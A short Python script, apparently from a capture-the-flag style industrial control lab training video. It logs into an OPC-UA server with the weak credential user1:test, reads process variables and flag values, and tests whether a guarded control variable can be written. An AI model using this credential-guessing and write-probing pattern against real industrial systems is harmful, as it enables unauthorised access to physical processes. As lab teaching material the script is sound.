#!/usr/bin/env python3
"""OPC-UA recon for the training video: sign in with the weak user1:test
credential, read the live process variables and the user flag, and show that
this read-only account cannot write the guarded variable."""
import asyncio
from asyncua import Client, ua

async def main():
    c = Client("opc.tcp://172.18.0.5:4840")
    c.set_user("user1"); c.set_password("test")
    await c.connect()
    print("[+] connected to OPC-UA as user1  (weak password: test)")
    cyb = [o for o in await c.nodes.objects.get_children()
           if (await o.read_browse_name()).Name == "CybICS Variables"][0]
    v = {}
    for node in await cyb.get_children():
        v[(await node.read_browse_name()).Name] = node
    print("    live process data and flags:")
    for n in ["GST", "HPT", "systemSen", "boSen", "userFLAG", "adminFLAG"]:
        if n in v:
            try: print(f"      {n:10} = {await v[n].read_value()!r}")
            except Exception: pass
    guard = [v[n] for n in v if n.startswith("Set")][0]
    print("[*] trying to write the guarded variable as user1 ...")
    try:
        await guard.write_value(ua.Variant(1, ua.VariantType.UInt16))
        print("      write ALLOWED")
    except Exception as e:
        print(f"      write DENIED: {type(e).__name__}  - user1 is read-only")
    await c.disconnect()

asyncio.run(asyncio.wait_for(main(), 20))
